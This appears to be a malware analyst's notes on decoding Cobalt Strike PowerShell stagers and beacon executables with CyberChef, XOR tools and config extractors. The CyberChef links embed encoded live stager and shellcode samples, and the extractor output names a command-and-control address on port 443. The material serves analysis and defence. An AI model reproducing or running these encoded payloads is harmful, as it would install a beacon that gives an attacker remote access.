CS beacon config decode

### CS powershell beacon (stager)

## Cyberchef

#Base64 + decode text:
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')&input=
#Base64 + gunzip:
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()&input=SDRzSUFBQUFBQUFBQUsxWGEyL2lTQmI5blB3S2YyZ0pVSk9zZVNhWlZVdGpzQUVETm1Cajg4aEVrYkVMS0Z4K1VDN3ptcG4vdnJjTUpPbnQ5RzVMdTBpV3E4cjNjZXJVdmJjdUptSjNKcVBZWlZya0llSE9SalRCVVNpVWIyK1hhZWd5UHVhRDF4VmlyekdOM0ZmSDh5aEtFdUhQMjV1aFE1MUF5SC9aT2ZRMWlMeVVvS0tRVGJnZzhsS0tDamMzdHpmWlVob216aEs5aGc3RE8vUWFJTGFPdkVUNEp1U2ZwVGlXbzhEQjRjdHZ2elZUU2xISXp2UDdObUpTa3FCZ1FUQks4Z1hoTDJHeVJoVGREUlliNURMaFQrSEw2MzJiUkF1SFhNU09UY2Rkd3k2azBPUGYrcEhyOEIzY216SEJMSi83NDQ5YzRmbXU5SEt2YkZPSEpQbWNlVXdZQ3U0OVFuSUY0ZThDZHpnK3hpaWYwN0JMb3lSYXN2c0pEaXZsZXl0RHIyZmd0VFAyWE9HeXMxWHN3RDUrdmtsdTlheVR6OEZ3Q054SVp3NXpSZUdaKzN0K2VSRitmME5qcENIREFicFhRNFpvRkp1STdyQ0xrdnVPRTNvRUdXZ0phcmtFeml4YzVRb0FnaUtXMGxDNFlnRzlYZVNqL0pjd0phUUlkcDkvMWU1TFhrZjdLN20vcXBUL3FBUlNRMFlMeFV0TS9Bb2RXaFkzWjNPd25SL1Fmd2l1QXZ4K0NMREM3ZCtmaGFxSENGbzVETDB5NFBkRHJON2UzRHhuUXdUN3lRK2pCR2Q2M3dTeEtHZ0F3bUVSUGZMakhOTVVGVjdleitmczlxcVpGSDlxcUhUVnV1aWNqK2VNNDV2d2JFZlllN205S2R4ZW9vZXZ2eTVTVER4RStmZWZaNE9NbGpoRThqRjBBdXhlQXo3LzJabWhKVUVaSC9kWE1SMXc1bk9YRDhpVEwremtPS0hQUDZvcEFXWnZ1bzB6T01tRmMwOEFGWVJFNFhzdzV6UE01OVJRUXdId2Q1NURtSDVaUXBxaHEvUWx0WTVYNzN6T1k3bEpuQ1FwQ3NNVTh0d3RDaVp5Q1BLS2doUW0rUEpKU2xtVURYUHZjTFdVTU93NkNidWFleWw4UXVuRmRUTUtJV05TRjA0WGFCaWJNWEt4UXpnclJhR0RQZFE0bW5oMWhaRDdsSk9tUXdpa0hGamF3Wm5BQ3VmQ1pEeG1xRmY4OS9nbzNKdUlxVUZNVUFEU1dSVnFFV2NGTmVlU1VWbTRPU3ZrNWY0RDdHdWVuSk9DYzNVbDZRTm9DQUNUUkt3bzJKZ3lxR3U1NGcrQjk3L0IrNzdFZkFlelNkSGxJUE5aSXFwTEtPam5LZ0RzSlBnRXhSaHRoY2NDVDhIbnhwSHhYUHF5ZTNYNVpmUHRqZWFNVk1wQXBVV2pvT0VrcUY0MXN3cVh6MVhLNmVyd05PelhqOXBHTFhlUHMxQS91S0ZObFYycjdkVFhoMUU1amR3eG85dU9Jc1BjY010SlF0b2tYcXo3VytmUTMyd09UODNwVVJsSzVUNnU0eHBXMDM3akZMYXdHNERlYUJETmpDZXE3dlJXUkpLSFhyTTFzUnk4MldhKzBxQmE4aFRuMkQrNTlUVWRsRkUwMit0YmRUZVV2TW5PclFlOXFGVm5vR3VuU2hwVEpSME1aMmwvMnc5VVhGM3ZaSnQxZDJyN3NkTXJ6NXhIc25oQW1iNjM1YjVtMjlYTzRmUFRFNS9qYlJOUjdtY0czS05LcVk0bTNZZFpHR00wU1ZlbnZZNWQ3eVNqY2hmVzAwaHo0NlNpbjl5bDcyK2N1R1NaZnFrM3R1WlQ0S2JrYkdsclVhZm1MQ1k3VzdMOHluQk9NMnk3Rm1EVU9VN3NscnVuV2V6UFBYdXJWSWFMWHRLRXZWWUkzYVpkSE5SV1dEMWU1SUx1MFRRYjhPN052ZDcyc2VhZHlzZFdYSFhxRkFPdkIvRDF3RGwycldTam9FSG9UbHM0Y05kbDJkaTRUMEc2clFIMmFrZnY5cVlIdW1XOStaRDdFZjJOV2RkRzRHTzdUWFFNdFdNRFl4elljN0p6cHBtZUNNL1hDZldyVHllM29oODRsb003NmMxbGJEMU05Rk01VHJVa3BsV09rMVlHK3lTdVA4SjRxUG9hN2FoWTJ4enJIZERiYTZiZG5SaWs1Y2hyU1ZjazBaRHR4dEQwcS9yWWozWFpJaVAxSCs2alNpdzFxcnVCR24vZDFFZG8xVHU2UGFsQzlucU1WOE1SUW1tdFh1OVBIcEpsM1dsczU3VmRhWGRTcGxONUZZdnp4b1FhZXVWeHZnYmVwWkV5SDlzSFg3YkYrY0xlSC9xMldCdktZbmRzaVUrOWtkS2RtdjVCbDFzc1cyKzIyR0M4ZjJwYUpSM3dOSnEyR0d2ajBXRXg5aDluMXJvNmxvMW8yQnp0dSsyV2lwUzl1T2hqZ2tkS28yMlYzTUZDN09wR2E5NDBsTmxjRXVlNkhNNzNNcnd2c2hPUVBSaSszYmFzdWRFZTZYMjc1STNibzcwMlVnNGRZMVhxV21UZXR1eEloL2xBYmxiam1kK1FES0pQNVdETzF6b1FTd3JvS1JNckhzdDd2UU8yaGlQaXRjRnUyVkxtaGh4MEZjTXZUVUVtSGJkSWJ5dytOZVhHVEZmMld0OVRZdDBRRDVZbDZjemJhN1pzU0RPcDRobW03N1hIdHF1MUpISGNsblRETm54VFdZbmo1b3J2ZjkyV3lnQlZXV3Q5N0c4R1dva21vM0gzY2RLT1M0Y0c2dWk5dFpnY0srT25KT2lZWW9ocCtOVmpvMzJGYk9iZFE3TThLL3ZZM1pkSmVXRFZxRVpXNFlZUnhPSldEZXM0OUFhVDFaVEhWR0xXWXgveVdkdk00bVNqSGZrN2hyampiL0t3cnNodG5pZEpwN0dIMkZiZ01lR3BjVmtKWkNET0hjaVhBM05vZzh0RkExZU9VMzFLckVuVWJTZTQybHRzN0ozeGdDcU1kcU45QW5GNXFtck1yYkNUMjE2cnVtS29FOWxJNEZHblNsUGJMVlR2a0JYVlpVU2hUenFkZVBQeFQ0RVA3Z2dUTHNVUlNpSVU0bXo1Njllc2V0NWN2anpEMGt2V2NINlkzaTBPWUsxU3U3MzUrOXBZN0p3UEJmWm5iWnptMEdUdEVDaTgwSXBkTDlKV1JGdVhobW9ZWWE2UnozLytIOEJITkVRRSttUG9vSy9YajBSSTVQSVc4Q2U5Mk85dkZ3UmNzeFlNSytWUFI0WDNtNlJRdU42UmkzUzV6UHFreXhhdjdlTDduVE9IL1JYZldPeWpjTVhXUlVFOFZFUlI1TytxQ0xaK25aWm1GQi96RjJ0RjNpUitnUEh1aG1SdTNubzZtb1lCK2oreS81M1AvODRyWnk1ck05OTV5eEI5VGhhL3QvOEZGTkZXSmdZT0FBQT0K
#Base64 + xor 35 dec(0x23)
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Decimal','string':'35'%7D,'Standard',false)&input=MnVneDlQTDZ5TWpJMkp5WW5OeGNuVnJFdkZHYTZoeFEydW9jVHRycUhFRGE2aFJjMnNzbEdscGJoTHFheExqang5Q1h5RVBBMkxpNmk1aUl1TEJ6bkZpY211b2NRT29ZUjlySXZORm9sczdLQ0ZXVWFpanF5TWpJMnVtNDFkRWF5THpjNmhyTzJlb1l3TnFJdlBBZFd2YzZtS29GNnRySXZWdUV1cHJFdU9QWXVMcUxtSWk0aHZEVnRKdklHOEhLMllhOGxiN2UyZW9Zd2RxSXZORllxZ3ZhMmVvWXo5cUl2TmlxQ2VyYXlMelludGllMzE2ZVdKN1lucGllV3VnendOaWNkekRlMko2ZVd1b01jcHMzTnpjZmtramFwMVVTazFLVFVaWEkySjFhcXJGYjZyU1lwbHZWQVVrM1BackV1cHJFdkZ1RXVOdUV1cGljMkp6WXBrWmRWcUUzUGJLc0NNakkzbHJxdUppbTVnaUl5TnVFdXBpY21KeVNTQmljbUtaZEtxODVkejJ5RnA0YTZyaWF4THhhcXI3YmhMcWNVc2pFZU9uY1hGaW1jaDJEUmpjOW11cTVXdWc0SE5KS1h4cnF0S1pQQ01qSTBralM2TVFJeU5xcXNOaW1pY2pJeU5pbVZabHZhWGM5bXVxMG11cStXcms0OXpjM054dUV1cHhjV0taRGlVN1dOejJwdU1zcHI0aUl5TnIzT3dzcDY4aUl5UElrTXJISWlNank2SGMzTndNU1ZKV1JsRmFEaEFORUEwUkRWQlBTazROVGtwTkRVbFFJL2M4SWxVSW82Y21JcCtqNlFlZ0t5Y0tBM2x3TnBpZ1BRZWV1NTY2TFc3c2Y2YUJxWjV2MXZ6RVhYRGdwMFpCV3JSTjM4WmhJMkpBUUVaVFZ4a0RWMFpiVnd4TFYwNVBEMEpUVTA5S1FFSlhTa3hOREZ0TFYwNVBDRnRPVHc5Q1UxTlBTa0JDVjBwTVRReGJUazhZVWg0VERSb1BDUXdKR0ZJZUV3MGJMaWxpUUVCR1UxY09iMEpOUkZaQ1JFWVpBMFpORG5ad0QwWk5HRkllRXcwV0xpbHhSa1ZHVVVaUkdRTkxWMWRUR1F3TVFFeEhSZzFKVWxaR1VWb05RRXhPREM0cFlrQkFSbE5YRG1aTlFFeEhTazFFR1FORVdVcFREd05IUmtWUFFsZEdMaWwyVUVaUkRtSkVSazFYR1FOdVRGbEtUMDlDREJZTkV3TUxkRXBOUjB4VVVBTnRkd01WRFJBWUEzZFJTa2RHVFZjTUZBMFRHQU5SVlJrU0VnMFRDZ05QU2toR0EyUkdRRWhNTGlrak9NMXJzUVRKOFdHcDF4QmVITktoMHN5M1Q5c21IUzBuaXJuK2R0UXczbGpaSnhDMlkya2ljdzJsMk9VNXJNbGduanRsZXRwRjVpTmluZE9XZ1hYYzltc1M2cGtqSTJNallwc2pNeU1qWXBwakl5TWpZcGw3aDNERzNQWnJzSEJ3YTZyRWE2clNhNnI1WXBzakF5TWphcXJhWXBreHRhckIzUFpyb09jRHB1TlhsVVdvSkdzaTRLYmpWdlI3ZTN0ckpvd3NJeU56NE10YzN0emNHaElORVJJV0RSc1dEUklYRUNNdmJJZHg
#Base64 + Decode text + Find replase "+"
https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')Find_/_Replace(%7B'option':'Simple%20string','string':'%22%2B%22'%7D,'',true,false,true,false)&input=TmdBd0FEa0FNZ0EyQURVQU9RQTBBREFBT3dCekFHd0FaUUJsQUhBQUlBQXRBSE1BSUFBb0FESUFNQUFwQURzQU5nQXdBRElBTVFBekFEUUFNd0EwQURzQUpBQnpBSGdBWkFBOUFDSUFhQUFpQUNzQUlnQWlBQ3NBSWdCckFHTUFJZ0FyQUNJQUlnQXJBQ0lBZFFBNkFGd0Fjd0J2QUNJQUt3QWlBQ0lBS3dBaUFHWUFkQUIzQUNJQUt3QWlBQ0lBS3dBaUFHRUFjZ0JsQUZ3QWJRQnBBQ0lBS3dBaUFDSUFLd0FpQUdNQWNnQnZBQ0lBS3dBaUFDSUFLd0FpQUhNQWJ3Qm1BSFFBWEFCUUFHVUFjZ0FpQUNzQUlnQWlBQ3NBSWdCekFHOEFJZ0FyQUNJQUlnQXJBQ0lBYmdCaEFHd0FJZ0FyQUNJQUlnQXJBQ0lBYVFCNkFHRUFkQUJwQUNJQUt3QWlBQ0lBS3dBaUFHOEFiZ0JjQUdjQVpRQlNBRUlBUVFCa0FGZ0FWQUJFQUVNQWF3Qk9BQ0lBT3dBa0FIUUFSd0JUQUZjQVN3QTlBR2NBY0FBZ0FDMEFjQUJoQUhRQWFBQWdBQ1FBY3dCNEFHUUFPd0JtQUc4QWNnQWdBQ2dBSkFCMEFFY0FVd0JYQUVzQVp3QnFBRUVBUFFBd0FEc0FKQUIwQUVjQVV3QlhBRXNBWndCcUFFRUFJQUF0QUd3QVpRQWdBRGNBTUFBMUFEc0FKQUIwQUVjQVV3QlhBRXNBWndCcUFFRUFLd0FyQUNrQWV3QlVBSElBZVFCN0FDUUFUd0JJQUdnQWJnQlFBQ3NBUFFBa0FIUUFSd0JUQUZjQVN3QXVBQ1FBZEFCSEFGTUFWd0JMQUdjQWFnQkJBSDBBUXdCaEFIUUFZd0JvQUhzQWZRQjlBRHNBSkFCMEFFY0FVd0JYQUVzQVp3QnFBRUVBUFFBd0FEc0Fkd0JvQUdrQWJBQmxBQ2dBSkFCMEFISUFkUUJsQUNrQWV3QWtBSFFBUndCVEFGY0FTd0JuQUdvQVFRQXJBQ3NBT3dBa0FHc0Fid0E5QUZzQWJRQmhBSFFBYUFCZEFEb0FPZ0FvQUNJQWN3QWlBQ3NBSWdBaUFDc0FJZ0J4QUhJQUlnQXJBQ0lBSWdBckFDSUFkQUFpQUNrQUtBQWtBSFFBUndCVEFGY0FTd0JuQUdvQVFRQXBBRHNBYVFCbUFDZ0FKQUJyQUc4QUlBQXRBR1VBY1FBZ0FERUFNQUF3QURBQUtRQjdBR0lBY2dCbEFHRUFhd0I5QUgwQUpBQkRBRllBWVFCWEFEMEFKQUJQQUVnQWFBQnVBRkFBTGdCeUFHVUFjQUJzQUdFQVl3QmxBQ2dBSWdBakFDSUFMQUFrQUdzQWJ3QXBBRHNBSkFCc0FGTUFaZ0JrQUcwQVBRQmJBR0lBZVFCMEFHVUFXd0JkQUYwQU9nQTZBQ2dBSWdCdUFDSUFLd0FpQUNJQUt3QWlBR1VBSWdBckFDSUFJZ0FyQUNJQWR3QWlBQ2tBS0FBa0FFTUFWZ0JoQUZjQUxnQk1BR1VBYmdCbkFIUUFhQUF2QURJQUtRQTdBR1lBYndCeUFDZ0FKQUIwQUVjQVV3QlhBRXNBWndCcUFFRUFQUUF3QURzQUpBQjBBRWNBVXdCWEFFc0Fad0JxQUVFQUlBQXRBR3dBZEFBZ0FDUUFRd0JXQUdFQVZ3QXVBRXdBWlFCdUFHY0FkQUJvQURzQUpBQjBBRWNBVXdCWEFFc0Fad0JxQUVFQUt3QTlBRElBS1FCN0FDUUFiQUJUQUdZQVpBQnRBRnNBSkFCMEFFY0FVd0JYQUVzQVp3QnFBRUVBTHdBeUFGMEFQUUJiQUdNQWJ3QnVBSFlBWlFCeUFIUUFYUUE2QURvQUtBQWlBRlFBSWdBckFDSUFJZ0FyQUNJQWJ3QkNBSGtBSWdBckFDSUFJZ0FyQUNJQWRBQmxBQ0lBS1FBb0FDUUFRd0JXQUdFQVZ3QXVBRk1BZFFCaUFITUFkQUJ5QUdrQWJnQm5BQ2dBSkFCMEFFY0FVd0JYQUVzQVp3QnFBRUVBTEFBeUFDa0FMQUFvQURJQUtnQTRBQ2tBS1FCOUFGc0FjZ0JsQUdZQWJBQmxBR01BZEFCcEFHOEFiZ0F1QUdFQWN3QnpBR1VBYlFCaUFHd0FlUUJkQURvQU9nQW9BQ0lBVEFBaUFDc0FJZ0FpQUNzQUlnQnZBQ0lBS3dBaUFDSUFLd0FpQUdFQVpBQWlBQ2tBS0FBa0FHd0FVd0JtQUdRQWJRQXBBRHNBV3dCUEFIQUFaUUJ1QUYwQU9nQTZBQ2dBSWdCVUFDSUFLd0FpQUNJQUt3QWlBR1VBY3dBaUFDc0FJZ0FpQUNzQUlnQjBBQ0lBS1FBb0FDa0FPd0E0QURBQU9RQTVBREFBTWdBMEFEZ0FNZ0E3QUE9PQ



## CommandLine

#Base64 + xor
cat shellcode.b64 | base64 -d > shellcode.bin
translate.py shellcode.bin -o shellcode.sc "byte ^ 0x23"

#Config extract
1768.py shellcode.sc --raw

file: shellcode.sc
Found shellcode:
Identification: CS reverse https x64 shellcode
Parameter: 907 b'95.115.50.123'
license-id: 
mov eax   :   273        443 b'\xb8\xbb\x01\x00\x00'


### CS beacon exe 

## find xor key by looking at file (lots of 00 in CS beacon so pattern pretty easy to spot) or

#Clone xcat from mstrand
git clone https://github.com/mstrand/xcat.git
#clone csce
git clone ssh://git@github.com/strozfriedberg/cobaltstrike-config-extractor.git
cd libcsce
pip install .

#find candidate xor keys
 xxd beacon.exe | awk '{$1=""; print $0}' | sort | uniq -c | sort -nr | head -10
#use xcat to xor 
 python3 ../../xcat-master/xcat.py -xa6c62b02a6e5c44c payload2.exe_ > payload2.xored
 
#Config extract
python3 -m venv csce
source csce/bin/activate
 
csce --pretty payload2.xored
